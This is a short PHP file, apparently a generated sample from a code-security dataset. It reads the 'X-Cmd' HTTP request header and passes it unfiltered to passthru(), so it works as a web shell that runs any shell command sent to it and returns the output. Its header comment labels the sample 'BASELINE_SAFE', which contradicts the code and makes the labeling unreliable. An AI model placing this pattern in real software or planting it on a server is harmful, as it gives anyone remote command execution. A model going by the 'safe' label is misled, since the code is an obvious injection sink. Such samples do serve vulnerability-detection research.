<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=HEADER; CE_MODE=H_GAH_DIRECT; SKELETON=S2; KEY=cmd; SINK=B4; VAR=v0208; HDR_NAME=X-Cmd */
function SINK_B4($command){
    passthru($command);
}
$h = function_exists("getallheaders") ? getallheaders() : [];
$inp = (string)($h["X-Cmd"] ?? "");
$inp = (string)$inp; // no value processing
class Runner {
    public static function run($x){
        return SINK_B4($x);
    }
}
$out = Runner::run($inp);
echo (string)($out);
?>
